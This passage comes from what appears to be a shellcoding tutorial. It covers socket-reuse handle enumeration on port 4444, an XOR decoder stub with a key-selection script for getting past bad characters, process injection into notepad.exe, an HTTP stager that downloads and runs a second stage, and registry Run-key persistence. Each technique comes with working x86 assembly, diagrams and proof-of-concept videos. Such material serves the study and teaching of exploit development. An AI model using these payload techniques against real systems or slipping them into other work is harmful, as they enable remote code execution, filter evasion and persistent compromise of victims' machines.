  <text x="675" y="102" text-anchor="middle" fill="#8b949e" font-size="10">end</text>
  <!-- Legend -->
  <rect x="80" y="130" width="590" height="48" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="185" y="150" text-anchor="middle" fill="#ff3366" font-size="11">X = getpeername() failed (not a socket)</text>
  <text x="430" y="150" text-anchor="middle" fill="#ff6b35" font-size="11">? = socket but wrong port</text>
  <text x="555" y="170" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">V = port matches! Use this handle.</text>
  <!-- Result -->
  <rect x="160" y="195" width="430" height="45" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="215" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">Handle 0xA4: getpeername() OK, sin_port == 0x5C11 (4444)</text>
  <text x="375" y="232" text-anchor="middle" fill="#e0e7ff" font-size="10">Redirect STARTUPINFOA stdio to this handle</text>
</svg></div>

*Figure 13.0 - Handle brute-force: iterate from 0x50, test each with getpeername, skip failures and wrong ports, stop at the matching socket.*

```nasm
call_getpeername:
    xor   eax, eax
    mov   al, 0x10                  ; namelen = 16
    push  eax
    mov   eax, esp                  ; EAX = &namelen
    push  eax                       ; Arg 3: &namelen
    push  dword ptr [ebp+0x28]     ; Arg 2: &sockaddr_in
    push  dword ptr [ebp+0x2C]     ; Arg 1: socket handle candidate
    call  dword ptr [ebp+0x24]     ; getpeername
    pop   ecx                       ; Clean namelen
    xor   edx, edx
    cmp   edx, eax                  ; Success (0)?
    jnz   loop_handle               ; Not a socket, try next

    ; Check port
    xor   eax, eax
    mov   ax, 0x5C11                ; Port 4444 in NBO
    mov   edi, dword ptr [ebp+0x28]
    cmp   word ptr [edi+0x02], ax   ; Compare sin_port
    jnz   loop_handle               ; Wrong port
```

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#0a0e17;border-radius:8px"><defs><marker id="ah13" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs><text x="375" y="30" fill="#e0e7ff" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Socket Reuse: Handle Enumeration</text><rect x="30" y="55" width="130" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="95" y="85" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">handle = 0x50</text><line x1="160" y1="80" x2="195" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="200" y="55" width="165" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="282" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">getpeername(handle,</text><text x="282" y="92" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">&addr, &len)</text><line x1="365" y1="80" x2="395" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="400" y="55" width="120" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/><text x="460" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Return != 0?</text><text x="460" y="92" fill="#ff3366" font-family="Consolas,monospace" font-size="10" text-anchor="middle">Not a socket</text><line x1="520" y1="80" x2="555" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="560" y="55" width="155" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="637" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">sin_port == 0x5C11?</text><text x="637" y="92" fill="#e0e7ff" font-family="Consolas,monospace" font-size="10" text-anchor="middle">(port 4444)</text><rect x="220" y="145" width="310" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/><text x="375" y="170" fill="#00ff88" font-family="Consolas,monospace" font-size="12" text-anchor="middle" font-weight="bold">MATCH! Use handle for STARTUPINFOA</text><text x="375" y="188" fill="#e0e7ff" font-family="Consolas,monospace" font-size="10" text-anchor="middle">All I/O flows through original exploit socket</text><line x1="637" y1="105" x2="530" y2="155" stroke="#00ff88" stroke-width="2"/><text x="600" y="135" fill="#00ff88" font-family="Consolas,monospace" font-size="10">YES</text></svg></div>

*Figure 13.1 - Socket reuse: scan handles, test with getpeername, match port, redirect stdio.*

---

## 14. XOR Encoding: Runtime Decoding

Manually avoiding bad characters one instruction at a time works for small payloads. For larger ones, **XOR encoding** transforms the entire payload so no bad characters remain, then decodes it at runtime.

### The Decoder Loop

The decoder stub sits in front of the encoded payload and restores each byte before execution.

```nasm
decode_loop:
    xor   byte ptr [esi], 0xAA     ; XOR current byte with key
    inc   esi                       ; Advance to next byte
    loop  decode_loop               ; Decrement ECX; jump if ECX != 0
```

The **`loop`** instruction decrements ECX by 1 and jumps if non-zero. After all iterations, the payload is restored to its original bytes.

### Key Selection Script

The key must itself be a safe byte, and XOR-ing every payload byte with it must produce only safe bytes.

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="260" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">XOR Key Selection</text>
  <!-- Original payload -->
  <text x="100" y="58" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Original Payload</text>
  <rect x="30" y="68" width="42" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="51" y="87" text-anchor="middle" fill="#e0e7ff" font-size="11">31</text>
  <rect x="76" y="68" width="42" height="30" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="97" y="87" text-anchor="middle" fill="#ff3366" font-size="11">00</text>
  <rect x="122" y="68" width="42" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="143" y="87" text-anchor="middle" fill="#e0e7ff" font-size="11">C9</text>
  <rect x="168" y="68" width="42" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="189" y="87" text-anchor="middle" fill="#e0e7ff" font-size="11">64</text>
  <rect x="214" y="68" width="42" height="30" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="235" y="87" text-anchor="middle" fill="#ff3366" font-size="11">0A</text>
  <rect x="260" y="68" width="42" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="281" y="87" text-anchor="middle" fill="#e0e7ff" font-size="11">8B</text>
  <text x="325" y="87" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <text x="475" y="87" text-anchor="middle" fill="#ff3366" font-size="11">Bad chars: 0x00, 0x0A highlighted in red</text>
  <!-- XOR operation -->
  <text x="170" y="120" text-anchor="middle" fill="#00ff88" font-size="14" font-weight="bold">XOR each byte with key 0xAA</text>
  <!-- Encoded result -->
  <text x="100" y="150" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Encoded Payload</text>
  <rect x="30" y="160" width="42" height="30" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="51" y="179" text-anchor="middle" fill="#00ff88" font-size="11">9B</text>
  <rect x="76" y="160" width="42" height="30" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="97" y="179" text-anchor="middle" fill="#00ff88" font-size="11">AA</text>
  <rect x="122" y="160" width="42" height="30" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="143" y="179" text-anchor="middle" fill="#00ff88" font-size="11">63</text>
  <rect x="168" y="160" width="42" height="30" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="189" y="179" text-anchor="middle" fill="#00ff88" font-size="11">CE</text>
  <rect x="214" y="160" width="42" height="30" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="235" y="179" text-anchor="middle" fill="#00ff88" font-size="11">A0</text>
  <rect x="260" y="160" width="42" height="30" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="281" y="179" text-anchor="middle" fill="#00ff88" font-size="11">21</text>
  <text x="325" y="179" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <text x="475" y="179" text-anchor="middle" fill="#00ff88" font-size="11">All bytes are now safe (no 0x00, 0x0A, 0x0D)</text>
  <!-- Summary -->
  <rect x="80" y="205" width="590" height="40" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="222" text-anchor="middle" fill="#e0e7ff" font-size="11">Key 0xAA valid: not in bad_chars AND (every_byte ^ 0xAA) not in bad_chars</text>
  <text x="375" y="238" text-anchor="middle" fill="#8b949e" font-size="10">Script tests all 255 keys and picks the first one that clears the entire payload</text>
</svg></div>

*Figure 14.0 - Key selection: find a byte that, when XORed with every payload byte, produces no bad characters.*

```python
for key in range(1, 256):
    if key in bad_chars:
        continue
    if all((b ^ key) not in bad_chars for b in payload):
        print(f"Valid key: 0x{key:02x}")
        break
```

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#0a0e17;border-radius:8px"><text x="375" y="30" fill="#e0e7ff" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">XOR Decode Loop (key = 0xAA)</text><text x="60" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Iter</text><text x="180" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Before</text><text x="340" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Operation</text><text x="510" y="70" fill="#ff6b35" font-family="Consolas,monospace" font-size="11" text-anchor="middle">After</text><rect x="20" y="85" width="710" height="38" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="109" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">1</text><text x="180" y="109" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8</text><text x="340" y="109" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8 XOR 0xAA</text><text x="510" y="109" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x72 = 'r'</text><rect x="20" y="128" width="710" height="38" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="152" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">2</text><text x="180" y="152" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF</text><text x="340" y="152" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF XOR 0xAA</text><text x="510" y="152" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x65 = 'e'</text><rect x="20" y="171" width="710" height="38" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="195" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">3</text><text x="180" y="195" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7</text><text x="340" y="195" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7 XOR 0xAA</text><text x="510" y="195" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6D = 'm'</text><rect x="20" y="214" width="710" height="38" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1"/><text x="60" y="238" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">4</text><text x="180" y="238" fill="#ff3366" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5</text><text x="340" y="238" fill="#e0e7ff" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5 XOR 0xAA</text><text x="510" y="238" fill="#00ff88" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6F = 'o'</text></svg></div>

*Figure 14.1 - Each iteration XORs one encoded byte back to its original value.*

### PoC Video

The following video demonstrates the XOR-encoded shellcode decoding itself at runtime before executing the payload in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/xor-encoding-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: XOR decoder stub running at runtime*

---

## 15. Process Injection: Running In Another Process

**Process injection** transplants our code into a different, stable process. The seven-step chain: Snapshot, Enumerate, Find, Open, Allocate, Write, Execute.

### Finding the Target Process

We compare the process name DWORD by DWORD against `"notepad.exe"`. The third DWORD uses a shift chain to avoid the null byte in `"exe\0"`.

```nasm
find_process:
    cmp  dword ptr [edi+0x24], 0x65746f6e ; "note"
    jne  next_process
    cmp  dword ptr [edi+0x28], 0x2e646170 ; "pad."
    jne  next_process
    ; Build "exe\0" via shift chain for null avoidance
    xor  eax, eax
    mov  al, 0x65
    shl  eax, 0x08
    mov  al, 0x78
    shl  eax, 0x08
    mov  al, 0x65                         ; EAX = 0x00657865
    cmp  dword ptr [edi+0x2c], eax
    jne  next_process
    jmp  found_explorer
```

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs><marker id="ah15" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
<rect width="750" height="280" rx="8" fill="#0a0e17"/>
<text x="375" y="30" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Process Injection Chain</text>
<rect x="30" y="55" width="140" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="100" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">1. Snapshot</text>
<text x="100" y="92" fill="#ff6b35" font-size="9" text-anchor="middle">CreateToolhelp32</text>
<line x1="170" y1="77" x2="195" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah15)"/>
<rect x="200" y="55" width="100" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="250" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">2. Enumerate</text>
<text x="250" y="92" fill="#ff6b35" font-size="9" text-anchor="middle">Process32Next</text>
<line x1="300" y1="77" x2="325" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah15)"/>
<rect x="330" y="55" width="90" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="375" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">3. Find</text>
<text x="375" y="92" fill="#ff6b35" font-size="9" text-anchor="middle">cmp DWORD</text>
<line x1="420" y1="77" x2="445" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah15)"/>
<rect x="450" y="55" width="100" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="500" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">4. Open</text>
<text x="500" y="92" fill="#ff6b35" font-size="9" text-anchor="middle">OpenProcess</text>
<line x1="550" y1="77" x2="575" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah15)"/>
<rect x="580" y="55" width="140" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="650" y="78" fill="#e0e7ff" font-size="10" text-anchor="middle">5. VirtualAllocEx</text>
<line x1="650" y1="100" x2="650" y2="130" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah15)"/>
<rect x="400" y="135" width="160" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="480" y="158" fill="#e0e7ff" font-size="10" text-anchor="middle">6. WriteProcessMemory</text>
<line x1="480" y1="180" x2="480" y2="210" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah15)"/>
<rect x="400" y="215" width="160" height="45" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="480" y="238" fill="#00ff88" font-size="10" text-anchor="middle" font-weight="bold">7. CreateRemoteThread</text>
<text x="480" y="252" fill="#e0e7ff" font-size="9" text-anchor="middle">Code runs in target</text>
</svg></div>

*Figure 15.1 - The seven-step injection chain: from process snapshot to remote code execution*

### Cross-Process Memory Layout

Once we locate the target PID, the injection writes our shellcode into the remote process's address space and starts a thread there.

<div align="center"><svg viewBox="0 0 750 360" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs>
  <marker id="ah15b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  <marker id="ah15c" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff3366"/></marker>
</defs>
<rect width="750" height="360" rx="8" fill="#0a0e17"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Cross-Process Injection Memory Layout</text>
<!-- Source process -->
<rect x="30" y="50" width="280" height="250" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="170" y="75" fill="#00d4ff" font-size="13" text-anchor="middle" font-weight="bold">Source Process (Exploited)</text>
<rect x="50" y="90" width="240" height="40" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
<text x="170" y="115" fill="#ff6b35" font-size="11" text-anchor="middle">Shellcode (our payload bytes)</text>
<rect x="50" y="145" width="240" height="30" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
<text x="170" y="165" fill="#8b949e" font-size="10" text-anchor="middle">hProcess = OpenProcess(PID)</text>
<rect x="50" y="190" width="240" height="30" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
<text x="170" y="210" fill="#8b949e" font-size="10" text-anchor="middle">remoteAddr = VirtualAllocEx(RWX)</text>
<rect x="50" y="235" width="240" height="30" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
<text x="170" y="255" fill="#00ff88" font-size="10" text-anchor="middle">WriteProcessMemory(hProc, remoteAddr, sc)</text>
<!-- Arrow -->
<line x1="310" y1="110" x2="430" y2="110" stroke="#ff3366" stroke-width="2.5" stroke-dasharray="8,4" marker-end="url(#ah15c)"/>
<text x="370" y="100" fill="#ff3366" font-size="10" text-anchor="middle">WriteProcessMemory</text>
<line x1="310" y1="250" x2="430" y2="200" stroke="#00ff88" stroke-width="2" stroke-dasharray="6,3" marker-end="url(#ah15b)"/>
<text x="370" y="240" fill="#00ff88" font-size="10" text-anchor="middle">CreateRemoteThread</text>
<!-- Target process -->
<rect x="435" y="50" width="280" height="250" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="575" y="75" fill="#ff3366" font-size="13" text-anchor="middle" font-weight="bold">Target Process (notepad.exe)</text>
<rect x="455" y="90" width="240" height="40" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="2"/>
<text x="575" y="115" fill="#ff3366" font-size="11" text-anchor="middle" font-weight="bold">Shellcode COPY (RWX page)</text>
<rect x="455" y="145" width="240" height="30" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
<text x="575" y="165" fill="#8b949e" font-size="10" text-anchor="middle">Original code + data (unchanged)</text>
<rect x="455" y="190" width="240" height="40" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="2"/>
<text x="575" y="210" fill="#00ff88" font-size="11" text-anchor="middle" font-weight="bold">New Thread starts here</text>
<text x="575" y="225" fill="#00ff88" font-size="9" text-anchor="middle">lpStartAddress = remoteAddr</text>
<!-- Legend -->
<rect x="160" y="318" width="430" height="30" rx="5" fill="#0a0e17" stroke="#8b949e" stroke-width="1"/>
<text x="375" y="338" fill="#e0e7ff" font-size="10" text-anchor="middle">Our code runs inside notepad.exe -- survives even if the exploit process exits</text>
</svg></div>

*Figure 15.2 - The shellcode is copied across process boundaries and executed as a new thread inside the target*

### PoC Video

The following video demonstrates the process injection shellcode injecting and executing code inside a remote process in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/process-injection-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Shellcode injected into remote process*

---

## 16. HTTP Stager: Downloading Second Stage

A stager writes a small first stage that downloads and executes a larger second stage from an HTTP server.

### The Read Loop

The read loop calls `InternetReadFile` in 4096-byte chunks, advancing the buffer pointer each time until zero bytes are returned.

```nasm
read_loop:
    xor   eax, eax
    mov   [edi], eax                ; Reset bytesRead
    xor   ecx, ecx
    mov   cl, 0x10
    shl   ecx, 0x08                 ; ECX = 0x1000 (4096 bytes)
    push  edi                       ; &bytesRead
    push  ecx                       ; bytes to read
    push  dword ptr [ebp+0x34]      ; lpBuffer
    push  dword ptr [ebp+0x30]      ; hFile
    call  dword ptr [ebp+0x2C]      ; InternetReadFile
    mov   eax, [edi]
    add   [ebp+0x34], eax           ; Advance buffer pointer
    test  eax, eax
    jnz   read_loop                 ; Keep reading until done
```

Then `CreateThread` executes the downloaded code and `WaitForSingleObject` keeps the process alive.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs><marker id="ah16" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
<rect width="750" height="280" rx="8" fill="#0a0e17"/>
<text x="375" y="30" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">HTTP Stager Flow</text>
<rect x="30" y="55" width="140" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="100" y="80" fill="#e0e7ff" font-size="10" text-anchor="middle">LoadLibraryA</text>
<text x="100" y="94" fill="#ff6b35" font-size="9" text-anchor="middle">("wininet.dll")</text>
<line x1="170" y1="80" x2="195" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah16)"/>
<rect x="200" y="55" width="125" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="262" y="80" fill="#e0e7ff" font-size="10" text-anchor="middle">InternetOpenA</text>
<line x1="325" y1="80" x2="350" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah16)"/>
<rect x="355" y="55" width="150" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="430" y="80" fill="#e0e7ff" font-size="10" text-anchor="middle">InternetOpenUrlA</text>
<line x1="505" y1="80" x2="530" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah16)"/>
<rect x="535" y="55" width="180" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
<text x="625" y="75" fill="#ff3366" font-size="10" text-anchor="middle" font-weight="bold">InternetReadFile</text>
<text x="625" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">Loop until bytesRead = 0</text>
<line x1="625" y1="105" x2="625" y2="135" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah16)"/>
<rect x="535" y="140" width="180" height="45" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="625" y="162" fill="#00ff88" font-size="10" text-anchor="middle" font-weight="bold">CreateThread(baseAddr)</text>
<text x="625" y="178" fill="#e0e7ff" font-size="9" text-anchor="middle">Execute downloaded shellcode</text>
<rect x="200" y="220" width="350" height="40" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="375" y="245" fill="#e0e7ff" font-size="11" text-anchor="middle">VirtualAlloc(RWX) holds the second stage in memory</text>
</svg></div>

*Figure 16.1 - Staged payload: first stage fetches second stage over HTTP, reads in a loop, then executes*

### Buffer Pointer Advancement

Each iteration reads up to 4096 bytes. The buffer pointer advances by the number of bytes actually read so data is written contiguously.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs><marker id="ah16b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs>
<rect width="750" height="280" rx="8" fill="#0a0e17"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">InternetReadFile: Buffer Filling Loop</text>
<!-- Memory bar -->
<rect x="50" y="55" width="650" height="40" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="375" y="80" fill="#00d4ff" font-size="11" text-anchor="middle">VirtualAlloc'd RWX buffer (total size for second stage)</text>
<!-- Iteration 1 -->
<rect x="50" y="110" width="160" height="35" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="130" y="132" fill="#00ff88" font-size="10" text-anchor="middle" font-weight="bold">Iter 1: 4096 B</text>
<line x1="130" y1="95" x2="130" y2="110" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah16b)"/>
<!-- Iteration 2 -->
<rect x="215" y="110" width="160" height="35" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
<text x="295" y="132" fill="#ff6b35" font-size="10" text-anchor="middle" font-weight="bold">Iter 2: 4096 B</text>
<line x1="295" y1="95" x2="295" y2="110" stroke="#ff6b35" stroke-width="1.5"/>
<!-- Iteration 3 -->
<rect x="380" y="110" width="160" height="35" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="460" y="132" fill="#ff3366" font-size="10" text-anchor="middle" font-weight="bold">Iter 3: 4096 B</text>
<line x1="460" y1="95" x2="460" y2="110" stroke="#ff3366" stroke-width="1.5"/>
<!-- Iteration N -->
<rect x="545" y="110" width="155" height="35" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="4,3"/>
<text x="622" y="132" fill="#8b949e" font-size="10" text-anchor="middle">Iter N: &lt;4096 B</text>
<!-- Pointer arrows -->
<text x="50" y="170" fill="#e0e7ff" font-size="10">[ebp+0x34] advances by bytesRead each iteration:</text>
<rect x="50" y="180" width="650" height="30" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
<text x="130" y="200" fill="#00ff88" font-size="10" text-anchor="middle">ptr+0</text>
<text x="295" y="200" fill="#ff6b35" font-size="10" text-anchor="middle">ptr+0x1000</text>
<text x="460" y="200" fill="#ff3366" font-size="10" text-anchor="middle">ptr+0x2000</text>
<text x="622" y="200" fill="#8b949e" font-size="10" text-anchor="middle">ptr+0x3000</text>
<!-- Stop condition -->
<rect x="150" y="225" width="450" height="40" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="375" y="243" fill="#e0e7ff" font-size="11" text-anchor="middle">When bytesRead == 0 : loop exits, all data received</text>
<text x="375" y="258" fill="#00ff88" font-size="10" text-anchor="middle">CreateThread(lpStartAddress = original buffer base)</text>
</svg></div>

*Figure 16.2 - Each loop iteration fills the next chunk of the buffer. When InternetReadFile returns 0 bytes, the payload is complete and ready for execution.*

### PoC Video

The following video demonstrates the HTTP stager downloading and executing a second-stage payload from a web server in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/http-stager-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: HTTP stager fetching second-stage payload*

---

## 17. Registry Persistence: Surviving Reboots

**Registry persistence** ensures our payload runs again after every reboot by writing to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

### Building the 12-DWORD Registry Path

The registry path string is 52 characters long. We push it as DWORDs in reverse order, building the string on the stack from right to left.

```nasm
    xor   eax, eax
    push  eax                       ; Null terminator
    xor   eax, eax
    mov   al, 0x6e                  ; 'n'
    push  eax                       ; "n\0\0\0"
    push  0x75525c6e                ; "n\Ru"
    push  0x6f697372                ; "rsio"
    push  0x6556746e                ; "ntVe"
    push  0x65727275                ; "urre"
    push  0x435c7377                ; "ws\C"
    push  0x6f646e69                ; "indo"
    push  0x575c7466                ; "ft\W"
    push  0x6f736f72                ; "roso"
    push  0x63694d5c                ; "\Mic"
    push  0x65726177                ; "ware"
    push  0x74666f53                ; "Soft"
    mov   edi, esp
```

<div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs>
  <linearGradient id="bg_s42" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
  <filter id="glow_s42"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
  <linearGradient id="line_s42" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  <marker id="ah17s" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
</defs>
<rect width="750" height="380" rx="10" fill="url(#bg_s42)"/>
<rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s42)"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold" filter="url(#glow_s42)">Stack String Build: 12-DWORD Push Sequence</text>
<text x="375" y="50" fill="#8b949e" font-size="10" text-anchor="middle">Each push writes 4 bytes, stack grows DOWN -- push order is REVERSE of read order</text>
<!-- Stack frames - bottom to top reading order -->
<text x="40" y="80" fill="#8b949e" font-size="10">Push order</text>
